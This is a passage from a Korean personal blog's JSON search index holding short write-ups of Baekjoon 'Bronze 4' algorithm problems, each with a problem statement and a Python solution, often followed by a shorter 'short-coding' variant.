= b와 같은 형식이 된다. #백준","link":"/2021/01/26/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10707%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10768번 문제","text":"특별한 날2월 18일은 올해 CCC에 있어서 특별한 날이다. 사용자로부터 정수인 월과 일을 입력받아 날짜가 2월 18일인지 전인지 후인지를 출력하는 프로그램이다. 만약 날짜가 2월 18일 전이면, “Before”을 출력한다. 만약 날짜가 2월 18일 후면, “After”을 출력한다. 만약 2월 18일이라면 “Special” 을 출력한다. 문제풀이 조건문으로 풀이하였다.조건이 많아 엄청 비효율적으로 보인다. 숏코딩 문제풀이 이번엔 입력받은 1월 = 30일 기준으로 잡아 일 단위로 변경하여 총 일을 구하여 인덱싱을 이용하여 풀이를 하였다.","link":"/2021/02/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10768%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10797번 문제","text":"백준 브론즈4 10797번 문제서울시는 6월 1일부터 교통 혼잡을 막기 위해서 자동차 10부제를 시행한다. 자동차 10부제는 자동차 번호의 일의 자리 숫자와 날짜의 일의 자리 숫자가 일치하면 해당 자동차의 운행을 금지하는 것이다. 예를 들어, 자동차 번호의 일의 자리 숫자가 7이면 7일, 17일, 27일에 운행하지 못한다. 또한, 자동차 번호의 일의 자리 숫자가 0이면 10일, 20일, 30일에 운행하지 못한다.여러분들은 일일 경찰관이 되어 10부제를 위반하는 자동차의 대수를 세는 봉사활동을 하려고 한다. 날짜의 일의 자리 숫자가 주어지고 5대의 자동차 번호의 일의 자리 숫자가 주어졌을 때 위반하는 자동차의 대수를 출력하면 된다.Link : 10797번: 10부제 문제 풀이123456789a = int(input())b = map(int, input().split())sum = 0for i in b: if a == i: sum += 1 print(sum) 반복문과 조건문을 사용하여 문제 해결하였다.이제 반복문과 조건문을 대신하여 파이썬의 내장 함수인 ::Count 함수::를 이용하여 풀이하겠다. 123i = inputk = i()print(i().count(k)) 이렇게 간단하게 구현하였다. 코드 해석변수 i를 input 함수로 지정하였다. 즉, 변수 i가 input 함수 그 자체가 된 것이다.변수 k에 첫번째 입력값을 넣어주고, print 함수 안에 있는 i()가 두번째 입력값을 받아서 count 함수로 k 값이 있는지 카운트를 하였다. Count 함수Link : 02-3 리스트 자료형 - 점프 투 파이썬점프투파이썬을 참고하면 된다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10797%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 11943번 문제","text":"파일 옮기기두 개의 바구니에 사과와 오렌지가 있다. 첫 번째 바구니에는 사과 A개와 오렌지 B개가 있으며 두 번째 바구니에는 사과 C개와 오렌지 D개가 있다. 당신은 한 바구니에 있는 과일 하나를 집어서 다른 바구니로 옮길 수 있다. 이런 식으로 과일을 옮길 때, 한 바구니에는 사과만 있게 하고 다른 쪽에는 오렌지만 있게 하려고 한다. 앞서 말한 조건을 만족하도록 과일을 옮길 때, 과일을 옮기는 최소 횟수를 구하는 프로그램을 작성하여라. 문제풀이1234a, b = map(int, input().split())c, d = map(int, input().split())print(min(a+d, c+b)) 두 개의 바구니에서 서로 다른 바구니의 사과와 오렌지의 합을 구해서 최소값을 구하면 된다.","link":"/2021/02/04/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-11943%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 11948번 문제","text":"과목선택JOI는 물리, 화학, 생물, 지구과학, 역사, 지리 총 6 과목의 시험을 봤다. 각 시험의 만점은 100점이다. JOI는 물리, 화학, 생물, 지구과학 4과목 중에서 3 과목을 선택하고 역사, 지리 2 과목 중에서 한 과목을 선택한다. 시험 점수의 합이 가장 높게 나오도록 과목을 선택할 때, JOI가 선택한 과목의 시험 점수의 합을 구하시오. 문제풀이 입력값들을 리스트로 입력받아서 인덱싱을 해줬다.먼저 0번째부터 3번째까지 인덱싱을 하면, 물리, 화확, 생물, 지구과학 입력값만 얻을 수 있다. 그 후 정렬하면, 가장 작은 수가 0번째로 가기 때문에 0번째를 버리면 된다. 그 후 나머지 값을 max 함수를 이용하여 가장 큰 수만 얻은 후 더해주면 된다. 숏코딩 문제풀이 이 풀이는 Asterisk(*)를 이용하여 간단하게 풀이하였다.Asterisk는 브론즈5에서 설명한 글이 있으니, 참고하면 된다.","link":"/2021/02/10/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-11948%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1212번 문제","text":"백준 브론즈4 1212번 문제 8진수가 주어졌을 때, 2진수로 변환하는 프로그램을 작성하시오. 문제풀이1print(bin(int(input(), 8))[2:]) int 함수의 파라미터를 8진수로 지정하여 8진수를 입력받아 bin 함수를 이용하여 2진수로 구하였다.하지만, 출력하면 0b11001100이라는 값이 출력이 된다.이를 해결하기 위해 슬라이싱을 이용하여 0b를 제거하였다. 숏코딩 문제풀이1print(f'{int(input(),8):b}') 이 코드는 bin 함수를 사용하지 않고, f-string을 이용하여 2진수를 구하였다. f-string 모드123456a = input() # 입력 10print(f'{int(a):b}') # 출력 1010print(f'{int(a):o}') # 출력 12print(f'{int(a):x}') # 출력 aprint(f'{int(a):X}') # 출력 Aprint(f'{int(a):d}') # 출력 10 123456a = input() # 입력 10print(f'{int(a):#b}') # 출력 0b1010print(f'{int(a):#o}') # 출력 0a12print(f'{int(a):#x}') # 출력 0xaprint(f'{int(a):#X}') # 출력 0XAprint(f'{int(a):#d}') # 출력 10","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1212%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1297번 문제","text":"TV 크기김탑은 TV를 사러 인터넷 쇼핑몰에 들어갔다. 쇼핑을 하던 중에, TV의 크기는 그 TV의 대각선의 길이로 나타낸 다는 것을 알았다. 하지만, 김탑은 대각선의 길이가 같다고 해도, 실제 TV의 크기는 다를 수도 있다는 사실에 직접 TV를 보러갈걸 왜 인터넷 쇼핑을 대각선의 길이만 보고있는지 후회하고 있었다. 인터넷 쇼핑몰 관리자에게 이메일을 보내서 실제 높이와 실제 너비를 보내달라고 했지만, 관리자는 실제 높이와 실제 너비를 보내지 않고 그것의 비율을 보내왔다. TV의 대각선 길이와, 높이 너비의 비율이 주어졌을 때, 실제 높이와 너비의 길이를 출력하는 프로그램을 작성하시오. 문제 풀이12345import matha, b, c = map(int, input().split())d = math.sqrt(a**2 / (b**2 + c**2))print(int(d*b), int(d*c)) TV 인치와 높이, 너비의 비율을 이용하여 높이, 넓이를 구하는 문제이다.구하는 공식은 인터넷에 검색한다면 나오니, 검색하면 된다.","link":"/2021/02/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1297%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 9498번 문제","text":"백준 9498번 문제시험 성적시험 점수를 입력받아 90 ~ 100점은 A, 80 ~ 89점은 B, 70 ~ 79점은 C, 60 ~ 69점은 D, 나머지 점수는 F를 출력하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/9498 123456a = int(input())if 90 &lt;= a &lt;= 100: print('A')elif 80 &lt;= a &lt;= 89: print('B')elif 70 &lt;= a &lt;= 79: print('C')elif 60 &lt;= a &lt;= 69: print('D')else: print('F') if문을 사용하여 문제를 해결하였다. 하지만 문제를 한 줄로 해결할 수 있다.문제에서는 10단위 씩 나누어 점수 평가를 하였다. 즉, 입력된 점수의 10의 자리를 알면 점수를 줄 수 있다는 것이다. 1print('FFFFFFDCBA'[int(input())//10]) 인덱싱를 사용하여 한 줄로 해결하였다.여기서 주의할 점은 Index은 시작이 0부터 시작함으로 총 11개의 평가 점수를 입력해주었다. IndexLink : https://wikidocs.net/14 12345list = [1, 2, 3]str = '123'print(list[2]) # 출력 : 3print(str[1]) # 출력 : 2 이런식으로 문자열, 리스트, 튜플, 딕셔너리 등에 유용하게 쓸 수 있다. Slicing12345list = [1, 2, 3]str = '123'print(list[0:2]) # 출력 : 3print(str[1:]) # 출력 : 2 Index로 범위를 지정하여 그 범위 안에 있는 데이터를 출력한다.","link":"/2020/12/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1330%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1330번 문제","text":"백준 1330번 문제두 수 비교하기두 정수 A와 B가 주어졌을 때, A와 B를 비교하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/1330 1234a, b = map(int, input().split())if a &gt; b: print('&gt;')elif a &lt; b: print('&lt;')else: print('==') 9498번 문제와 같이 조건문을 사용하여 문제 해결을 했다.하지만 bool과 index을 조합하면 좀 더 python스럽게 만들 수 있다. 12a,b=map(int,input().split())print(['&gt;&lt;'[a&lt;b],'=='][a==b]) false는 0으로 표현이 가능하고, true는 1로 표현이 가능하다.이것을 이용하여 index을 이용하였다. 12print(2&lt;2, '12'[2&lt;1]) # 출력 : False 1print(2&lt;3, '12'[2&lt;3]) # 출력 : True 2","link":"/2020/12/23/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1330%EB%B2%88-%EB%AC%B9/"},{"title":"백준 브론즈4 13866번 문제","text":"팀 나누기4명의 친구가 탁구를 하고 있다. 각각은 정수형으로 표현된 스킬 레벨을 가지고 있고, 숫자가 높을수록 더 좋은 플레이어다. 4명의 친구는 각각 두 명씩 구성된 두 팀을 구성하려고 한다. 게임이 더 흥미롭게 하기 위해서 팀의 스킬 레벨을 최대한 가깝게 유지하기를 원한다. 팀의 스킬 레벨은 팀원의 스킬 레벨의 합계이다. 그들은 탁구 선수로는 탁월하지만, 수학이나 컴퓨터와 같은 다른 것들에 능숙하지 않다. 팀의 스킬 레벨이 가능한 작은 차이를 갖도록 도와주자. 문제풀이12a = [*map(int, input().split())]print(abs((a[3]+a[0]) - (a[2]+a[1])))) 풀이 설명입력 조건: 0 &lt;= a &lt;= b &lt;= c &lt;= d &lt;= 104 첫번째로 입력 받은 값이 무조건 작으니, 가장 큰 마지막과 더해주면 된다. 근데 이상한 점이 문제 제출 시 절대값으로 구해줘야 한다는 것이다. 조건을 보면 -가 나올 경우가 없어보인데도 말이다.","link":"/2021/02/19/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-13866%EB%B2%88/"},{"title":"백준 브론즈4 14470번 문제","text":"전자레인지JOI 군은 식사 준비를 위해 A℃의 고기를 전자레인지로 B℃까지 데우려고 한다. 고기는 온도가 0℃보다 낮을 때 얼어 있고, 0℃보다 높을 때는 얼어 있지 않다. 온도가 정확히 0℃일 때 고기는 얼어 있을 수도, 얼어 있지 않을 수도 있다. JOI 군은 가열할 때 고기가 아래의 규칙을 따라 데워진다고 가정하고, 고기를 데우는 데 걸리는 시간을 어림하기로 했다. 고기가 얼어 있고 온도가 0℃ 미만일 때 : 온도가 C초에 1℃씩 오른다. 고기가 얼어 있고 온도가 정확히 0℃일 때 : 얼어 있지 않은 상태로 만드는(해동하는) 데 D초가 걸린다. 고기가 얼어 있지 않을 때 : 온도가 E초에 1℃씩 오른다. 이 규칙을 토대로, 고기가 B℃까지 데워지는 데 몇 초가 걸리는지 구하라. 문제풀이12a, b, c, d, e = map(int, open(0))print([-(a)*c + b*e + d, b*e - a*e][a&gt;0]) 풀이 설명a : 고기온도b : 목표온도c : 얼어있는 고기를 1도씩 올리는 시간d : 얼어있는 고기를 해동하는 시간e : 얼지 않은 고기를 1도씩 올리는 시간 다음과 같은 시간을 구하고 값을 더해주면 목표 온도까지의 시간을 구할 수 있다. 0&gt;고기온도: 언 고기을 0도까지 해동하는 시간 (a*c) 0도의 고기를 해동하는 시간 (d) 0도에서 목표온도까지 도달하는 시간 (b*e) 0&lt;고기온도: 고기온도에서 목표온도까지 도달하는 시간 (b*e - a*e)","link":"/2021/02/23/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14470%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 14681번 문제","text":"백준 14681번 문제사분면 고르기흔한 수학 문제 중 하나는 주어진 점이 어느 사분면에 속하는지 알아내는 것이다. 사분면은 아래 그림처럼 1부터 4까지 번호를 갖는다. “Quadrant n”은 “제n사분면”이라는 뜻이다. 예를 들어, 좌표가 (12, 5)인 점 A는 x좌표와 y좌표가 모두 양수이므로 제1사분면에 속한다. 점 B는 x좌표가 음수이고 y좌표가 양수이므로 제2사분면에 속한다.점의 좌표를 입력받아 그 점이 어느 사분면에 속하는지 알아내는 프로그램을 작성하시오. 단, x좌표와 y좌표는 모두 양수나 음수라고 가정한다.Link : https://www.acmicpc.net/problem/2753 123456789101112a, b = map(int, open(0))if a &gt;= 0: if b &gt;= 0: print(1) else: print(4)else: if b &gt;=0: print(2) else: print(3) 조건문을 왕창써서 해결한 코드이다.좀 더 파이썬스럽게 변경하곘다. 1print(&quot;3421&quot;[input()&gt;&quot;0&quot;::2][input()&gt;&quot;0&quot;]) 슬라이싱과 bool을 이용하여 수정하였다.두 개의 설명은 9498번 문제와 1038번 문제를 보면 된다.Link : https://lrtk-coder.github.io/2020/12/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1008%EB%B2%88-%EB%AC%B8%EC%A0%9C/ 코드를 설명하자면,&quot;3421&quot;[input()&gt;&quot;0&quot;::2]은 입력받은 값이 0보다 크면 True가 나온다.파이썬에서 True는 1로 통한다. 그래서 파이썬에선 ::2의 조건을 통해서 index 1의 자리와 3의 자리를 출력한다.그 후, [input()&gt;&quot;0&quot;]을 통해 인덱스 0의 자리를 가져올지, 1의 자리를 가져올지를 결정한다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14681%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 14924번 문제","text":"폰 노이만과 파리역사상 최고의 천재중 하나인 폰 노이만에게는 다음과 같은 재밌는 일화가 있다. 그의 동료는 어느 날 폰 노이만의 천재성을 시험해보기 위해서 다음과 같은 질문을 던졌다. “200마일 길이의 철로의 양쪽 끝에 서 있는 두 대의 기차가 시속 50마일의 속도로 서로를 향해 출발했습니다. 이때부터 두 기차가 서로 충돌할 때까지 파리가 시속 75마일의 속도로 두 기차사이를 왔다 갔다 했습니다. 파리가 이동한 거리는 모두 몇 마일일까요?” 폰 노이만은 문제를 듣고 1초의 지체도 없이 150마일이라고 답했다. 그의 동료는 크게 실망하며 말했다. “역시 당신은 똑똑하군요. 보통 사람들은 이 문제를 무한급수를 이용해서 풀려고 하지만 그렇게 하면 매우 긴 시간이 걸리죠. 하지만 간단한 논리를 사용하면 순식간에 파리가 이동한 거리를 구할 수 있습니다. 당신도 그 논리를 이용한 것이죠?” 그러자 폰 노이만은 이렇게 답했다. “아니요, 무한급수로 풀었는데요?” 이 문제를 무한급수를 통해 푸는 방법은 다음과 같다. 수직선 위에 기차 A, B가 있다고 하자. 파리와 같이 출발하는 기차를 A라 하고, 그 위치를 기준점으로 하면 기차 B는 기준점에서 200마일 만큼 떨어진 지점에 있다. 이때 시간 t에서 파리의 위치는 75t 이고 기차 B의 위치는 200 – 50t 이다. 이를 이용하면 파리와 기차 B가 처음 만나는 위치는 기준점에서 120마일 떨어진 지점임을 알 수 있다. 120마일은 파리의 첫 이동거리 이고 이를 a1이라고 하자. 한편 이때 기차 A는 80마일 떨어진 지점에 위치한다 (기차 A의 속도는 파리의 속도의 2/3 이므로). 그러므로 기차 A와 B의 사이가 40마일로 줄어들었고, 같은 식으로 파리의 두 번째 이동거리 a2는 (1/5)a1임을 알 수 있다. 이와 같이 생각하면, ai+1은 (1/5)ia1이고, 파리의 총 이동거리는 Σ(1/5)ia1 = 150 즉 150마일임을 알 수 있다. 이 문제를 푸는 “간단한 논리”는 다음과 같다. 두 기차는 200/(502) = 2 시간 후에 만난다. 파리는 2시간동안 시간당 75마일의 속도로 이동하므로 275 = 150 마일을 이동한다. 우리는 위에서 제시한 문제를 풀 수 있는 프로그램을 만들고 싶다. 하지만 우리의 컴퓨터는 안타깝게도 폰 노이만의 두뇌보다 성능이 좋지 못하기 때문에 무한급수를 이용하여 프로그램을 만들 수는 없다. 위에서 말한 “간단한 논리”를 이용하여 기차의 속도 S, 파리의 속도 T, 그리고 처음 두 기차 사이의 거리 D가 주어졌을 때 두 기차가 만날 때까지 파리의 이동거리 F를 계산하는 프로그램을 작성하라. 문제풀이12s, t, d = map(int, input().split())print(int((d/(s*2))*t)) 문제에서 나온 공식을 그대로 코드로 작성하였다.","link":"/2021/02/14/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14924%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 15726번 문제","text":"이칙연산다음과 같이 세 수가 연속해서 주어졌을 때 한 번의 곱셈 기호와 한 번의 나눗셈 기호를 이용하여 만든 식 중 가장 큰 값을 출력하는 프로그램을 작성하시오. (세 수의 순서는 변하지 않는다.) 32 ☐ 16 ☐ 8 문제풀이12a, b, c = map(int, input().split())print(int(max(a*b/c, a/b*c))) 풀이 설명문제의 요점은 3개의 숫자를 곱셈과 나누기를 이용해서 계산했을 때 어떻게 계산해야 가장 큰 수가 나오는지를 구하는 문제이다. 숫자1 * 숫자2 / 숫자3 숫자1 / 숫자2 * 숫자3 1과 2의 결과값 크키 비교 후 큰 수 출력. 여기서, 많이 헤매는 부분은 //, / 둘 중 어느 것을 써야하는지이다. 123a, b, c = map(int, input().split()) # 10 3 3 입력print(a*b/c, a/b*c) # 10.0 10.0 출력print(a*b//c, a//b*c) # 10 9 출력 //은 소수점을 버리기 때문에 값이 차이가 나는 것을 알 수 있다. 하지만 이 문제에서 왜 /을 쓰는지는 모르겠다.","link":"/2021/02/24/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14935%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 15680번 문제","text":"연세대학교 연세대학교의 영문명은 YONSEI, 슬로건은 Leading the Way to the Future이다. 이를 출력하는 프로그램을 작성해보도록 하자. 백준 15680번 문제 문제풀이1print(['YONSEI', 'Leading the Way to the Future'][int(input())]) 입력값이 0과 1 뿐이니, 리스트에 출력값을 넣어서 index에 입력값을 넣으면 원하는 출력값을 볼 수 있다.","link":"/2021/02/03/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-15680%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 16204번 문제","text":"카드 뽑기앞 면에 O와 X가 적혀있는 카드 N개가 있다. N개의 카드 중 M개의 카드의 앞면에는 O가 한 개 적혀있고, 나머지 N-M개의 카드의 앞면에는 X가 한 개 적혀있다. 카드의 뒷 면은 두 종류의 카드 모두 같은 모양이라 구분할 수 없다. 카드의 뒷 면에 O나 X를 하나씩 적으려고 한다. 이 때, O는 K개, X는 N-K개 적으려고 한다. 앞 면과 뒷 면에 같은 모양이 적혀있는 카드의 최대 개수를 구하는 프로그램을 작성하시오. 문제풀이12n, m, k = map(int, input().split())print(min(m, k) + min(n-m, n-k)) 풀이 설명문제를 정리하자면, 카드 총 갯수 : n 앞면 O의 갯수 : m 앞면 X의 갯수 : n-m 뒷면 O의 갯수 : k 뒷면 X의 갯수 : n-k 이렇게 정리가 된다. 즉, m과 k을 비교하여 가장 작은 수를 같은 모양이 적혀있는 O 카드의 최대 개수로 보면 된다. X 카드의 경우 n-m과 n-k를 비교하면 된다. 그 후 더해주면 된다.","link":"/2021/02/27/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-16204%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 16431번 문제","text":"베시와 데이지농부 존은 소 베시와 소 데이지를 키우고 있습니다. 두 소는 자유롭게 1,000 × 1,000 2차원 격자 목초지를 누비며 놀고 있습니다. 농부 존이 종을 치면 베시와 데이지가 농부 존이 있는 곳으로 달려갑니다. 베시가 B에 있을 때 1초 후에 움직일 수 있는 칸과 데이지가 D에 있을 때 1초 후에 움직일 수 있는 칸을 나타낸 그림 베시는 1초 후에 꼭짓점을 공유하는 8개의 칸 중 하나로 이동할 수 있고 데이지는 1초 후에 변을 공유하는 4개의 칸 중 하나로 이동할 수 있습니다. 칸들은 충분히 넓어서 칸 하나에도 베시와 데이지 그리고 존이 같이 서 있을 수 있습니다. 베시와 데이지 두 소 모두 최단 경로로 존에게 갈 때 어떤 소가 더 빨리 도착할까요? 문제풀이123456789101112131415l = lambda:map(int, input().split())a = absb_row, b_col = l()d_row, d_col = l()j_row, j_col = l()if a(b_row - j_row) &gt; a(b_col - j_col): b = (a(b_row - j_row)-a(b_col - j_col)) + a(b_col - j_col)else: b = (a(b_col - j_col)-a(b_row - j_row)) + a(b_row - j_row)d = a(d_row - j_row) + a(d_col - j_col)print([['bessie', 'tie'][b==d], 'daisy'][b &gt; d]) 문제풀이 설명 이동한 1칸 당 1초 베시는 위아래, 대각선으로 1칸 씩 움직인다고 한다. 이를 숫자로 표현했을 때, 123위: [+1, 0]아래: [-1, 0]대각선 : [+1, +1], [+1, -1], [-1, +1], [-1, -1] 으로 표현이 가능하다. 123위: [1, 0]아래: [1, 0]대각선 : [1, 1] 하지만, 문제의 답은 각자의 위치에서 존까지의 최소 이동 시간을 구하는게 목적임으로 절대값으로 표현하겠다. 데이지는 위아래 1칸 씩만 움직일 수 있다. 12위: [1, 0]아래: [0, 1] 이동해야할 거리이동할 거리는 각 가로세로와 존의 가로세로을 뺀 값을 절대값으로 변환하면 얻을 수 있다. 여기서 데이지는 어차피 위아래로 밖에 움직이지 못하기 때문에 존의 가로세로을 뺀 절대값에서 각 값을 더해주면 총 이동거리가 나온다.베시는 대각선이 있기 때문에 이를 계산하기 위해 조건을 걸어줘야한다.","link":"/2021/02/17/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-16431%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 16486번 문제","text":"운동장 한 바퀴세연이네 학교 운동장은 아래와 같다. 위의 그림에서 영역 A와 B는 반원이며, 영역 C는 직사각형이다. 영역 C의 가로의 길이를 d1, 영역 A의 반지름의 길이 d2의 값이 주어지면 운동장의 한 바퀴 둘레를 알아내는 프로그램을 작성하시오. (단, 이 문제에서는 π (원주율)의 값을 3.141592라고 한다.) 문제풀이12a, b = map(int, open(0))print(a*2+b*2*3.141592) 직사각형인 c의 밑변의 길이는 a로 나타났으니, 2*a를 하면 C의 길이가 나온다. 원의 길이는 2π반지름으로 구할 수 있다.원의 반지름은 b로 입력되니, 2πb로 구하면 된다. 그러므로, 운동장의 길이는 2a + 2π*b로 구하면 된다.","link":"/2021/02/13/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-16486%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1712번 문제","text":"백준 1712번 문제손익분기점월드전자는 노트북을 제조하고 판매하는 회사이다. 노트북 판매 대수에 상관없이 매년 임대료, 재산세, 보험료, 급여 등 A만원의 고정 비용이 들며, 한 대의 노트북을 생산하는 데에는 재료비와 인건비 등 총 B만원의 가변 비용이 든다고 한다.예를 들어 A=1,000, B=70이라고 하자. 이 경우 노트북을 한 대 생산하는 데는 총 1,070만원이 들며, 열 대 생산하는 데는 총 1,700만원이 든다.노트북 가격이 C만원으로 책정되었다고 한다. 일반적으로 생산 대수를 늘려 가다 보면 어느 순간 총 수입(판매비용)이 총 비용(=고정비용+가변비용)보다 많아지게 된다. 최초로 총 수입이 총 비용보다 많아져 이익이 발생하는 지점을 손익분기점(BREAK-EVEN POINT)이라고 한다.A, B, C가 주어졌을 때, 손익분기점을 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/1712 12345a, b, c = map(int, input().split())for i in range(1, 12): print(a+b*i) print(c*i, '\\n') 123456789101112131415161718192021222324252627282930313233343536입력1000 70 170출력 결과1070170 1140340 1210510 1280680 1350850 14201020 14901190 15601360 16301530 17001700 17701870 문제를 이해하는데 좀 걸렸다.문제를 쉽게 풀이하자면, 노트북을 생산하는데 들어가는 고정 비용, 재료비와 인건비를 합친 가변 비용 두 비용을 더해서 노트북 생산 금액이 측정이 된다.예시대로, 고정 비용 - 1000, 가변 비용 - 70 이면, 노트북 2개를 생산하는 비용은 ** 고정 비용 + ( 가변 비용 * 2 ) **이라는 공식이 성립되고, 1140이라는 비용이 들게 된다. 판매값이 170이 측정이 될 때, 노트북 몇 대를 팔아야 생산 비용을 넘어설 수 있는지를 구하는 문제였다. 공식을 구하자면, ** 고정 비용 + (가변 비용 * X) &lt; 판매값 * X **이 성립이 된다.여기서 ** 가변 비용 * X *를 옆에 옮기면, ** 고정 비용 &lt; (판매값 - 가변 비용) \\ X **이 된다. 우리의 목표는 x를 구하는 것이 목적이므로, x만 남기고 옆으로 넘긴다.** 고정 비용 / (판매값 - 가변 비용) &lt; X **이라는 최종 공식이 구해지게 된다. 이 공식을 이용하여 문제풀이를 하겠다. 12345678a, b, c = map(int, input().split())if (c &lt;= b): d = -1else: d = a//(c-b)+1print(d) 여기서 더 풀이를 하자면, 판매값과 가변 비용의 크기 비교를 한 이유는 가변 비용의 크기가 판매값보다 크면, 공식이 음수로 되기 때문에 x가 0이라도 참이 된다. 그래서 예외 처리를 하였다. else문을 보면 공식에 +1를 한 모습을 볼 수 있다. +1은 소수점을 반올림을 한 경우를 생각하여 더해주었다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1712%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 17362번 문제","text":"수학은 체육과목 입니다 2이 사진을 기억하는가? 이 사진은 오래전부터 인터넷에 돌아다니는 사진으로, 작년 전대프연 예선 A번에서는 수학을 정말 못 하는 고등학생인 성원이의 시험지로 소개되었다. 저작권이 있는 사진일 수 있어 알아보기 어렵게 가공했음을 양해 바란다. 예선 날짜가 다가오는데도 적당한 A번 문제를 생각하지 못한 출제진은 작년 전대프연 예선 A번을 응용해서 문제를 만들기로 했다. 이를 위해 사진 속 문제를 찾아본 출제진은 해당 문제가 2007학년도 6월 고등학교 1학년 전국연합학력평가 수리 영역 26번임을 알게 되었다. 시험지를 내려받고 문제들을 살펴보던 출제진은 아래와 같은 문제를 발견했다. 예상했겠지만, 여러분은 이제 위의 19번 문제 세 번째 줄에 등장하는 수 ‘1000’을 임의의 자연수로 바꾸었을 때 그에 해당하는 답을 출력하는 프로그램을 작성해야 한다. 문제풀이123456789101 2 3 4 5 8 7 69 10 11 12 13 16 15 1417 18 19 20 문제를 읽어보니 이런 형태로 숫자가 흘려가고 있었다.엄지에서 새끼을 찍고, 다시 엄지로 돌아가는데 이 주기가 8 숫자라는 것을 파악을 했다. 그럼 8로 나눈 나머지를 보고 어떤 손가락에 들어갈 지를 결정할 수 있을거라 생각하였다. 1~10를 8로 나누어 보면 1, 2, 3, 4, 5, 6, 7, 0, 1, 2이라는 나머지가 나온다. 1234561 2 3 4 5 0 7 61 2 이를 좀더 쉬게 보기 위해 위에 나온 손가락의 형태로 정렬하였다. 엄지 : 1 검지 : 2, 0 중지 : 3, 7 약지 : 4, 6 새끼 : 5 검증을 시도하니, 해당 손가락의 숫자을 찾을 수 있었다. 좀 더 많은 숫자들로 정확한 검증을 위해 코드를 짜서 검증을 하였다. 검증코드1234567891011finger_dict = {1 : [], 2 : [], 3 : [], 4 : [], 5 : []}for _ in range(1, 21): print(_%8, end=' ') if _%8 == 1: finger_dict[1].append(_) elif _%8 in [2, 0]: finger_dict[2].append(_) elif _%8 in [3, 7]: finger_dict[3].append(_) elif _%8 in [4, 6]: finger_dict[4].append(_) elif _%8 == 5: finger_dict[5].append(_)print()print(finger_dict) dict의 Key는 손가락을 가르키는 숫자이며, for문으로 1~20을 8로 나눈 나머지 값들을 가지고, 해당 손가락의 리스트에 값을 넣어줬다. 8로 나눈 나머지가 손가락의 위치를 지정할 수 있다는 논리가 검증이 되었다. 이를 가지고 문제풀이를 하였다. 숏코딩 문제풀이 해당 손가락 위치의 값을 알았으니, 인덱스로 좀 더 간단하게 만들 수 있다.","link":"/2021/02/09/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-17362%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 17388번 문제","text":"와글와글 숭고한숭고한 알고리즘 캠프가 다가오고 있고 방학이 되어서까지도 각 대학들의 협업은 계속되고 있다. 그럼에도 불구하고 운영진들과 강사진들이 각자의 일정 때문에 바빠 계획에 차질이 조금씩 생기고 있다. 숭고한 알고리즘 캠프의 대표인 창호는 효율적인 일처리를 위해 엄정한 평가를 내리기로 하였다. 창호는 숭고한 알고리즘 캠프의 구성원인 숭실대학교(Soongsil University), 고려대학교(Korea University), 한양대학교(Hanyang University)의 참여도를 수치화하였다. 창호가 보기에 세 대학교의 참여도의 합이 100 이상이면 일처리가 잘 되고 있기에 안심할 수 있지만, 100 미만이면 창호는 참여도가 가장 낮은 대학의 동아리에게 무언의 압박을 넣을 예정이다. 숭고한 